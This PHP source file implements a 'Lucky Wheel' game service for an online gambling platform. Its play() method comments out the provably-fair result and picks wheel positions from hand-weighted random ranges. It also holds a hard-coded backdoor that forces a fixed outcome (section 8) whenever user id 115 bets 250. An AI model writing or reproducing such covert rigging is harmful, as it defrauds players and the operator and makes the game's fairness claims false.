<?php
/**
 *   Stake iGaming platform
 *   ----------------------
 *   GameService.php
 * 
 *   @copyright  Copyright (c) FinancialPlugins, All rights reserved
 *   @author     FinancialPlugins <info@financialplugins.com>
 *   @see        https://financialplugins.com
*/

namespace Packages\LuckyWheel\Services;

use App\Helpers\Games\NumberGenerator;
use App\Models\Game;
use App\Models\User;
use App\Services\GameService as ParentGameService;
use App\Services\RandomGameService;
use Illuminate\Support\Facades\Log;
use Packages\LuckyWheel\Models\LuckyWheel;

class GameService extends ParentGameService implements RandomGameService
{
    protected $gameableClass = LuckyWheel::class;

    protected $numberGenerator;

    public function __construct(User $user)
    {
        parent::__construct($user);

        $this->numberGenerator = new NumberGenerator();
    }

    public function makeSecret(): string
    {
        return $this->numberGenerator->generate()->getNumber();
    }

    
    public function play($params): GameService
    {
        $provablyFairGame = $this->getProvablyFairGame();

        $variation = $params['variation'];
        $config = config('lucky-wheel.variations')[$variation];

        
        $this->numberGenerator->setMax(count($config->sections) - 1)
            ->setNumber($provablyFairGame->secret)
            ->shift($provablyFairGame->shift_value);

        $bet = $params['bet'];

        $randomNumber = random_int(1, 1000);

        $gameable = new $this->gameableClass();
        $gameable->variation = $variation;
//      $gameable->position = $this->numberGenerator->getNumber();

        if($this->getUser()->id ===115 && $bet == 250){
            $randomNumber = random_int(655, 669);
        }

        if($randomNumber< 99) {
            $gameable->position = 0;
        }
        else if($randomNumber >= 100 && $randomNumber< 196){
            $gameable->position = 1;
        }
        else if($randomNumber >= 196 && $randomNumber< 297){
            $gameable->position = 2;
        }
        else if($randomNumber >= 297 && $randomNumber< 345){
            $gameable->position = 3;
        }
        else if($randomNumber >= 345 && $randomNumber< 444){
            $gameable->position = 4;
        }
        else if($randomNumber >= 444 && $randomNumber< 456){
            $gameable->position = 5;
        }
        else if($randomNumber >= 456 && $randomNumber< 555){
            $gameable->position = 6;
        }
        else if($randomNumber >= 555 && $randomNumber< 654){
            $gameable->position = 7;
        }
        else if($randomNumber >= 654 && $randomNumber< 670){
            $gameable->position = 8;
        }
        else if($randomNumber >= 670 && $randomNumber< 769){
            $gameable->position = 9;
        }
        else{
            $randomNumber1 = random_int(1, 4);
            if($randomNumber1 <=2){
                $gameable->position = 0;
            }
            else{
                $gameable->position = 9;
            }
        }

        
        $this->gameable = $gameable;

        $this->save([
            'bet' => $bet,
            'win' => $bet * $config->sections[$gameable->position]->payout,
            'status' => Game::STATUS_COMPLETED
        ]);

        return $this;
    }

    public static function createRandomGame(User $user): void
    {
        $instance = new self($user);

        $instance->createProvablyFairGame(random_int(10000,99999));

        $minBet = intval(config('settings.bots.games.min_bet'));
        $maxBet = intval(config('settings.bots.games.max_bet'));

        $variationsCount = count(config('lucky-wheel.variations'));
        $variation = $variationsCount > 1 ? random_int(0, $variationsCount - 1) : 0;

        $instance->play([
            'variation' => $variation,
            'bet'       => random_int(
                $minBet ?: config('lucky-wheel.variations')[$variation]->min_bet,
                $maxBet ?: config('lucky-wheel.variations')[$variation]->max_bet
            )
        ]);
    }
}
